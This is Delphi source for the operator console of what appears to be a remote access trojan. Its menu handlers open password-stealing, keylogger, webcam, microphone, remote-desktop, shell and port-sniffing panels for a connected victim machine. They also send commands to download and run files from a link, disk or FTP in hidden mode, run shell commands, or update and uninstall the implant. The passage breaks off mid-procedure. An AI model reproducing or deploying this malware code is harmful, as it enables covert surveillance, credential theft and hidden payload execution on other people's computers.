unit UnitManager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, ToolWin, ExtCtrls, UnitMain, SocketUnitEx, UnitFunctions,
  UnitConstants, UnitCommands, UnitVariables, UnitRepository, BTMemoryModule,
  UnitEncryption, ShellAPI, StdCtrls, Gauges, UnitCountry, ImgList, CommCtrl,
  uJSONConfig, WinSkinData, jpeg;

type
  TFormManager = class(TForm)
    pnlMain: TPanel;
    tlb1: TToolBar;
    btn2: TToolButton;
    btn3: TToolButton;
    btn4: TToolButton;
    btn9: TToolButton;
    btn10: TToolButton;
    btn8: TToolButton;
    pm1: TPopupMenu;
    T1: TMenuItem;
    F1: TMenuItem;
    R1: TMenuItem;
    S1: TMenuItem;
    pm2: TPopupMenu;
    D1: TMenuItem;
    W1: TMenuItem;
    M1: TMenuItem;
    K1: TMenuItem;
    P1: TMenuItem;
    pm4: TPopupMenu;
    F2: TMenuItem;
    F3: TMenuItem;
    F4: TMenuItem;
    F5: TMenuItem;
    S2: TMenuItem;
    S3: TMenuItem;
    pm5: TPopupMenu;
    C1: TMenuItem;
    F6: TMenuItem;
    pm6: TPopupMenu;
    R5: TMenuItem;
    R4: TMenuItem;
    R3: TMenuItem;
    C2: TMenuItem;
    U2: TMenuItem;
    F8: TMenuItem;
    F9: TMenuItem;
    F10: TMenuItem;
    U4: TMenuItem;
    U3: TMenuItem;
    dlgOpen1: TOpenDialog;
    M3: TMenuItem;
    pnl1: TPanel;
    g2: TGauge;
    lbl1: TLabel;
    lbl2: TLabel;
    g1: TGauge;
    P2: TMenuItem;
    P3: TMenuItem;
    il1: TImageList;
    lvLogs: TListView;
    btn5: TToolButton;
    N1: TMenuItem;
    A1: TMenuItem;
    S6: TMenuItem;
    D2: TMenuItem;
    tmr1: TTimer;
    N2: TMenuItem;
    C3: TMenuItem;
    S7: TMenuItem;
    W2: TMenuItem;
    btn7: TToolButton;
    btn11: TToolButton;
    chk1: TCheckBox;
    lvPlugins: TListView;
    btn1: TToolButton;
    il3: TImageList;
    pm3: TPopupMenu;
    L1: TMenuItem;
    R2: TMenuItem;
    procedure btn2Click(Sender: TObject);
    procedure T1Click(Sender: TObject);
    procedure F1Click(Sender: TObject);
    procedure R1Click(Sender: TObject);
    procedure S1Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure W1Click(Sender: TObject);
    procedure M1Click(Sender: TObject);
    procedure K1Click(Sender: TObject);
    procedure P1Click(Sender: TObject);
    procedure P2Click(Sender: TObject);
    procedure P3Click(Sender: TObject);
    procedure F3Click(Sender: TObject);
    procedure F4Click(Sender: TObject);
    procedure F5Click(Sender: TObject);
    procedure S2Click(Sender: TObject);
    procedure S3Click(Sender: TObject);
    procedure C1Click(Sender: TObject);
    procedure F6Click(Sender: TObject);
    procedure R5Click(Sender: TObject);
    procedure R4Click(Sender: TObject);
    procedure R3Click(Sender: TObject);
    procedure C2Click(Sender: TObject);
    procedure F8Click(Sender: TObject);
    procedure F9Click(Sender: TObject);
    procedure F10Click(Sender: TObject);
    procedure U4Click(Sender: TObject);
    procedure U3Click(Sender: TObject);
    procedure M3Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btn5Click(Sender: TObject);
    procedure S6Click(Sender: TObject);
    procedure D2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure tmr1Timer(Sender: TObject);
    procedure C3Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure S7Click(Sender: TObject);
    procedure W2Click(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure btn7Click(Sender: TObject);
    procedure L1Click(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure R2Click(Sender: TObject);
    procedure lvLogsCustomDrawItem(Sender: TCustomListView;
      Item: TListItem; State: TCustomDrawState; var DefaultDraw: Boolean);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: TClientDatas;
    procedure WMDROPFILES(var msg: TWMDropFiles); message WM_DROPFILES;
    procedure AddSentLog(Log: string);           
    procedure AddPlugin(pPath: string);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
    procedure AddLog(Action, Log: string; i: Integer = -1; lColor: TColor = clBlack);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormManager: TFormManager;

implementation

uses
  UnitDesktop, UnitFilesManager, UnitFun, UnitInformations, UnitLogger, UnitFtpManager,
  UnitMessagesBox, UnitMicrophone, UnitPasswords, UnitPortScanner, UnitPortSniffer,
  UnitRegistryManager, UnitScripts, UnitShell, UnitTasksManager, UnitWebcam, UnitChat,
  UnitClientEdit, UnitSystem, UnitNotes, UnitPluginsManager;

{$R *.dfm}

constructor TFormManager.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormManager.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormManager.AddSentLog(Log: string);
begin
  Self.AddLog('[SENT]', Log, 0, clBlue);
end;
                 
procedure TFormManager.AddRecvLog(Log: string; lColor: TColor);
begin
  Self.AddLog('[RECEIVED]', Log, 1, lColor);
end;
   
procedure TFormManager.WndProc(var Msg: TMessage);
var
  Datas, TmpStr: string;
  TmpItem: TListItem;
  LogDatas: TLogDatas;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin
    Datas := string(Msg.WParam);
    TmpStr := Copy(Datas, 1, Pos('|', Datas) - 1);
    Delete(Datas, 1, Pos('|', Datas));
    
    g1.Progress := StrToInt(TmpStr);
    g2.Progress := StrToInt(Datas);
  end
  else

  if Msg.Msg = WM_ADD_EVENTLOG then
  begin
    LogDatas := PLogDatas(Msg.WParam)^;

    TmpItem := Self.lvLogs.Items.Add;
    TmpItem.Caption := TimeToStr(Now) + ' ' + LogDatas.Action;
    TmpItem.SubItems.Add(LogDatas.Log);
    TmpItem.ImageIndex := LogDatas.i;
    TmpItem.Data := TObject(LogDatas.lColor);
    SendMessage(Self.lvLogs.Handle, WM_VSCROLL, SB_LINEDOWN, 0);
    Application.ProcessMessages;
  end;
end;

procedure TFormManager.btn2Click(Sender: TObject);
var
  TmpForm: TFormInformations;
begin
  if Client.Forms[0] <> nil then TFormInformations(Client.Forms[0]).Show else
  begin
    TmpForm := TFormInformations.Create(Self, Client);
    Client.Forms[0] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    TmpForm.Width := Self.pnlMain.Width;
    TmpForm.Height := Self.pnlMain.Height;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.T1Click(Sender: TObject);
var
  TmpForm: TFormTasksManager;
begin
  if Client.Forms[1] <> nil then TFormTasksManager(Client.Forms[1]).Show else
  begin
    TmpForm := TFormTasksManager.Create(Self, Client);
    Client.Forms[1] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;     
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.F1Click(Sender: TObject);
var
  TmpForm: TFormFilesManager;
begin
  if Client.Forms[2] <> nil then TFormFilesManager(Client.Forms[2]).Show else
  begin
    TmpForm := TFormFilesManager.Create(Self, Client);
    Client.Forms[2] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone; 
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.R1Click(Sender: TObject);
var
  TmpForm: TFormRegistryManager;
begin
  if Client.Forms[3] <> nil then TFormRegistryManager(Client.Forms[3]).Show else
  begin
    TmpForm := TFormRegistryManager.Create(Self, Client);
    Client.Forms[3] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;  
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.S1Click(Sender: TObject);
var
  TmpForm: TFormShell;
begin
  if Client.Forms[4] <> nil then TFormShell(Client.Forms[4]).Show else
  begin
    TmpForm := TFormShell.Create(Self, Client);
    Client.Forms[4] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.D1Click(Sender: TObject);
var
  TmpForm: TFormDesktop;
begin
  if Client.Forms[5] <> nil then TFormDesktop(Client.Forms[5]).Show else
  begin
    TmpForm := TFormDesktop.Create(Self, Client);
    Client.Forms[5] := TmpForm;
    TmpForm.Caption := 'Desktop [' + Client.UserId + ']';
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.W1Click(Sender: TObject);
var
  TmpForm: TFormWebcam;
begin
  if Client.Infos.WebCam = 'Not installed' then Exit;
  if Client.Forms[6] <> nil then TFormWebcam(Client.Forms[6]).Show else
  begin
    TmpForm := TFormWebcam.Create(Self, Client);
    Client.Forms[6] := TmpForm;
    TmpForm.Caption := 'Webcam [' + Client.UserId + ']';
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.M1Click(Sender: TObject);
var
  TmpForm: TFormMicrophone;
begin
  if Client.Forms[7] <> nil then TFormMicrophone(Client.Forms[7]).Show else
  begin
    TmpForm := TFormMicrophone.Create(Self, Client);
    Client.Forms[7] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.K1Click(Sender: TObject);
var
  TmpForm: TFormLogger;
begin
  if Client.Forms[8] <> nil then TFormLogger(Client.Forms[8]).Show else
  begin
    TmpForm := TFormLogger.Create(Self, Client);
    Client.Forms[8] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.P1Click(Sender: TObject);
var
  TmpForm: TFormPasswords;
begin
  if Client.Forms[9] <> nil then TFormPasswords(Client.Forms[9]).Show else
  begin
    TmpForm := TFormPasswords.Create(Self, Client);
    Client.Forms[9] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone; 
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.P2Click(Sender: TObject);
var
  TmpForm: TFormPortSniffer;
begin
  if Client.Forms[10] <> nil then TFormPortSniffer(Client.Forms[10]).Show else
  begin
    TmpForm := TFormPortSniffer.Create(Self, Client);
    Client.Forms[10] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;   
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.P3Click(Sender: TObject);
var
  TmpForm: TFormPortScanner;
begin
  if Client.Forms[11] <> nil then TFormPortScanner(Client.Forms[11]).Show else
  begin
    TmpForm := TFormPortScanner.Create(Self, Client);          
    Client.Forms[11] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;     
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.F3Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute file from link' , 'Link', TmpStr) then Exit;
  case MessageBox(Handle, 'Do you want to execute file in hidden mode?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES:  begin
              Client.SendDatas(FILESEXECUTEFROMLINK + '|' + TmpStr + '|Y');
              AddSentLog('Download file from ' + TmpStr + ' and execute in hidden mode');
            end;
    IDNO: begin
            Client.SendDatas(FILESEXECUTEFROMLINK + '|' + TmpStr + '|N');
            AddSentLog('Download file from ' + TmpStr + ' and execute in visible mode');
          end;
    IDCANCEL: Exit;
  end;
end;

procedure TFormManager.F4Click(Sender: TObject);
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  case MessageBox(Handle, 'Do you want to execute file in hidden mode?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES:  begin
              Client.SendDatas(FILESEXECUTEFROMLOCAL + '|' + dlgOpen1.FileName + '|Y|' +
                IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
              AddSentLog('Download file ' + dlgOpen1.FileName + ' and execute in hidden mode');
            end;
    IDNO: begin
            Client.SendDatas(FILESEXECUTEFROMLOCAL + '|' + dlgOpen1.FileName + '|N|' +
              IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
            AddSentLog('Download file ' + dlgOpen1.FileName + ' and execute in visible mode');
          end;
    IDCANCEL: Exit;
  end;
end;

procedure TFormManager.F5Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
  JSONConfig: TJSONConfig;
begin
  TmpForm := TFormFTPManager.Create(Self);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  case MessageBox(Handle, 'Do you want to execute file in hidden mode?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES:  begin
              Client.SendDatas(FILESEXECUTEFROMFTP + '|' + FtpHost + '|' + FtpUser + '|' +
                FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort) + '|Y|');
              AddSentLog('Download file from ' + FtpHost + ' and execute in hidden mode');
            end;
    IDNO: begin
            Client.SendDatas(FILESEXECUTEFROMFTP + '|' + FtpHost + '|' + FtpUser + '|' +
              FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort) + '|N|');
            AddSentLog('Download file from ' + FtpHost + ' and execute in visible mode');
          end;
    IDCANCEL: Exit;
  end;
                 
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormManager.S2Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Execute shell command', 'Shell command', TmpStr) then Exit;
  Client.SendDatas(EXECUTESHELLCOMMAND + '|' + TmpStr);
  AddSentLog('Execute shell command ' + TmpStr);
end;

procedure TFormManager.S3Click(Sender: TObject);
var
  TmpForm: TFormScripts;
begin
  if Client.Forms[13] <> nil then TFormScripts(Client.Forms[13]).Show else
  begin
    TmpForm := TFormScripts.Create(Self, Client);
    Client.Forms[13] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;      
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.C1Click(Sender: TObject);
var
  TmpForm: TFormChat;
begin
  if Client.Forms[14] <> nil then TFormChat(Client.Forms[14]).Show else
  begin
    TmpForm := TFormChat.Create(Self, Client);
    Client.Forms[14] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;    
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.F6Click(Sender: TObject);
var
  TmpForm: TFormFun;
begin
  if Client.Forms[15] <> nil then TFormFun(Client.Forms[15]).Show else
  begin
    TmpForm := TFormFun.Create(Self, Client);
    Client.Forms[15] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone; 
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;
     
procedure TFormManager.M3Click(Sender: TObject);
var
  TmpForm: TFormMessagesBox;
begin
  if Client.Forms[12] <> nil then TFormMessagesBox(Client.Forms[12]).Show else
  begin
    TmpForm := TFormMessagesBox.Create(Self, Client);
    Client.Forms[12] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.R5Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := '127.0.0.1:80';
  if not InputQuery('Reconnect to host', 'Host address', TmpStr) then Exit;
  if (TmpStr = '') or (Pos(':', TmpStr) <= 0) then Exit;
  Client.SendDatas(CLIENTRECONNECT + '|' + TmpStr);
  AddSentLog('Reconnect to host address ' + TmpStr);
end;

procedure TFormManager.R4Click(Sender: TObject);
var
  TmpForm: TFormClientEdit;
  TmpStr: string;
  i: Integer;
begin
  TmpForm := TFormClientEdit.Create(Self);
  TmpForm.Caption := 'Edit client id';

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  if (TmpForm.edt1.Text = '') and (TmpForm.lv1.ItemIndex = -1) then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;
                                                   
  i := TmpForm.lv1.ItemIndex;
  if i = -1 then TmpStr := '' else TmpStr := TmpForm.lv1.Items[i].Caption;
  TmpStr := TmpForm.edt1.Text + ':' + TmpStr;

  Client.SendDatas(CLIENTRENAME + '|' + TmpStr);
  AddSentLog('Edit client id by ' + TmpStr);

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormManager.R3Click(Sender: TObject);
begin
  Client.SendDatas(CLIENTRESTART + '|');
  AddSentLog('Restart');
end;

procedure TFormManager.C2Click(Sender: TObject);
begin
  Client.SendDatas(CLIENTCLOSE + '|'); 
  AddSentLog('Close');
end;

procedure TFormManager.F8Click(Sender: TObject);
var
  TmpStr: string;
begin
  if not InputQuery('Update client from link' , 'Link', TmpStr) then Exit;
  Client.SendDatas(CLIENTUPDATEFROMLINK + '|' + TmpStr);  
  AddSentLog('Update from link ' + TmpStr);
end;

procedure TFormManager.F9Click(Sender: TObject);
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Client file (*.exe)|*.exe';
  dlgOpen1.DefaultExt := 'exe';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  Client.SendDatas(CLIENTUPDATEFROMLOCAL + '|' + dlgOpen1.FileName + '|' +
    IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);       
  AddSentLog('Update from file ' + dlgOpen1.FileName);
end;

procedure TFormManager.F10Click(Sender: TObject);
var
  TmpForm: TFormFTPManager;
  JSONConfig: TJSONConfig;
begin
  TmpForm := TFormFTPManager.Create(Self);
  TmpForm.edtFtphost.Text := FtpHost;
  TmpForm.edtFtpUser.Text := FtpUser;
  TmpForm.edtFtpPass.Text := FtpPass;
  TmpForm.edtFtpDir.Text := FtpDir;
  TmpForm.edtFilename.Text := FtpFilename;
  TmpForm.seFtpPort.Value := FtpPort;

  if TmpForm.ShowModal <> mrOK then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  FtpHost := TmpForm.edtFtphost.Text;
  FtpUser := TmpForm.edtFtpUser.Text;
  FtpPass :=TmpForm.edtFtpPass.Text;
  FtpDir := TmpForm.edtFtpDir.Text;
  FtpFilename := TmpForm.edtFilename.Text;
  FtpPort := TmpForm.seFtpPort.Value;

  if (FtpHost = '') or (FtpUser = '') or (FtpPass = '') or
    (FtpDir = '') or (FtpFilename = '')
  then
  begin
    TmpForm.Release;
    TmpForm := nil;
    Exit;
  end;

  Client.SendDatas(CLIENTUPDATEFROMFTP + '|' + FtpHost + '|' + FtpUser + '|' +
    FtpPass + '|' + FtpDir + '|' + FtpFilename + '|' + IntToStr(FtpPort));  
  AddSentLog('Update from ' + FtpHost);
           
  JSONConfig := TJSONConfig.Create(FTPSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;

  TmpForm.Release;
  TmpForm := nil;
end;

procedure TFormManager.U4Click(Sender: TObject);
begin
  if MessageBox(Handle, PChar('Are you sure you want to uninstall connected client?'),
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  Client.SendDatas(CLIENTUNINSTALL + '|'); 
  AddSentLog('Uninstall');
end;

procedure TFormManager.U3Click(Sender: TObject);
var
  Tmpstr: string;
begin
  TmpStr := GetUserFolder(Client.UserId);
  MyShellExecute(Handle, TmpStr, '', SW_SHOWNORMAL);
end;

procedure TFormManager.WMDROPFILES(var Msg: TWMDropFiles);
var
  FileName: array[0..255] of Char;
  TmpBool: Integer;
  i, j: Integer;
begin
  TmpBool := MessageBox(Handle, 'Do you want to execute file(s) in hidden mode?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL);
  if TmpBool = IDCANCEL then Exit;

  j := DragQueryFile(Msg.Drop, $FFFFFFFF, FileName, SizeOf(FileName));
  for i := 0 to j - 1 do
  begin
    DragQueryFile(Msg.Drop, i, FileName, SizeOf(FileName));
    case TmpBool of
      IDYES:  begin
                Client.SendDatas(FILESEXECUTEFROMLOCAL + '|' + FileName + '|Y|' + IntToStr(MyGetFileSize(FileName)) + #0);
                AddSentLog('Download file ' + FileName + ' and execute in hidden mode');
              end;
      IDNO: begin
              Client.SendDatas(FILESEXECUTEFROMLOCAL + '|' + FileName + '|N|' + IntToStr(MyGetFileSize(FileName)) + #0);
              AddSentLog('Download file ' + FileName + ' and execute in visible mode');
            end;
    end;

    Sleep(100);
  end;

  DragFinish(Msg.Drop);
end;

procedure TFormManager.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Manager width');
  if i <= 0 then Width := 780 else Width := i;
  i := JSONConfig.ReadInteger('Manager height');
  if i <= 0 then Height := 503 else Height := i;
  i := JSONConfig.ReadInteger('Manager left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Manager top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;

  DragAcceptFiles(Handle, True);
end;

procedure TFormManager.btn5Click(Sender: TObject);
begin
  lvLogs.Visible := btn5.Down;
end;

procedure TFormManager.AddLog(Action, Log: string; i: Integer; lColor: TColor);
var
  LogDatas: TLogDatas;
begin
  LogDatas.Action := Action;
  LogDatas.Log := Log;
  LogDatas.i := i;
  LogDatas.lColor := lColor;
  SendMessage(Self.Handle, WM_ADD_EVENTLOG, WParam(@LogDatas), 0);
end;

procedure TFormManager.S6Click(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  TmpStr: string;
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0)) + 'Alarms';
  dlgOpen1.Filter := 'Wave file (*.wav)|*.wav';
  dlgOpen1.DefaultExt := 'wav';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
  TmpStr := GetSettingsFolder(Client.UserId) + '\Alarm.settings';
  JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
  JSONConfig.WriteString('Alarm', dlgOpen1.FileName);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormManager.D2Click(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := GetSettingsFolder(Client.UserId) + '\Alarm.settings';
  if FileExists(TmpStr) then DeleteFile(TmpStr);
end;

procedure TFormManager.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
begin
  if chk1.Checked then
  begin
    chk1.Checked := False;
    chk1Click(Sender);
  end;
                 
  if Client.Forms[0] <> nil then  TFormInformations(Client.Forms[0]).Close;
  if Client.Forms[1] <> nil then  TFormTasksManager(Client.Forms[1]).Close;
  if Client.Forms[2] <> nil then  TFormFilesManager(Client.Forms[2]).Close;
  if Client.Forms[3] <> nil then  TFormRegistryManager(Client.Forms[3]).Close;
  if Client.Forms[4] <> nil then  TFormShell(Client.Forms[4]).Close;
  if Client.Forms[7] <> nil then  TFormMicrophone(Client.Forms[7]).Close;
  if Client.Forms[8] <> nil then  TFormLogger(Client.Forms[8]).Close;
  if Client.Forms[9] <> nil then  TFormPasswords(Client.Forms[9]).Close;
  if Client.Forms[10] <> nil then  TFormPortSniffer(Client.Forms[10]).Close;
  if Client.Forms[11] <> nil then  TFormPortScanner(Client.Forms[11]).Close;
  if Client.Forms[12] <> nil then  TFormMessagesBox(Client.Forms[12]).Close;
  if Client.Forms[13] <> nil then  TFormScripts(Client.Forms[13]).Close;
  if Client.Forms[14] <> nil then  TFormChat(Client.Forms[14]).Close;
  if Client.Forms[15] <> nil then  TFormFun(Client.Forms[15]).Close;
  if Client.Forms[17] <> nil then  TFormSystem(Client.Forms[17]).Close;   
  if Client.Forms[18] <> nil then  TFormNotes(Client.Forms[18]).Close;

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Manager width', Width);
  JSONConfig.WriteInteger('Manager height', Height);
  JSONConfig.WriteInteger('Manager left', Left);
  JSONConfig.WriteInteger('Manager top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormManager.tmr1Timer(Sender: TObject);
begin
  Client.SendDatas(UnitCommands.MONITOR + '|');
end;

procedure TFormManager.C3Click(Sender: TObject);
var
  TmpBool: Boolean;
  TmpStr: string;
  i: Integer;
begin
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0)) + 'Profiles';
  dlgOpen1.Filter := 'Configuration file (*.config)|*.config';
  dlgOpen1.DefaultExt := 'config';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;
                   
  TmpStr := FileToStr(dlgOpen1.FileName);
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  i := StringCount('|', TmpStr);

  if i <> 42 then
  begin
    MessageBox(Handle, 'This file is not a valid configuration file.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;
      
  case MessageBox(Handle, 'Do you want to restart client now?', PROGRAMINFOS,
    MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES: TmpBool := True;
    IDNO: TmpBool := False;
    IDCANCEL: Exit;
  end;

  TmpStr := MyReplaceStr(TmpStr, '|', '×');
  Client.SendDatas(CLIENTUPDATECONFIG + '|' + TmpStr + '|' + MyBoolToStr(TmpBool));

  AddSentLog('Update configuration to ' + dlgOpen1.FileName);
end;

procedure TFormManager.FormShow(Sender: TObject);
begin
  btn2Click(Sender);
  R2Click(Sender);
end;

procedure TFormManager.S7Click(Sender: TObject);
var
  TmpForm: TFormSystem;
begin
  if Client.Forms[17] <> nil then TFormSystem(Client.Forms[17]).Show else
  begin
    TmpForm := TFormSystem.Create(Self, Client);
    Client.Forms[17] := TmpForm;
    TmpForm.Parent := Self.pnlMain;
    TmpForm.Align := alClient;
    TmpForm.BorderStyle := bsNone;
    if FormMain.skndt1.Active = True then FormMain.skndt1.AddNestForm(Self, TmpForm);
    TmpForm.Show;
  end;
end;

procedure TFormManager.W2Click(Sender: TObject);
var
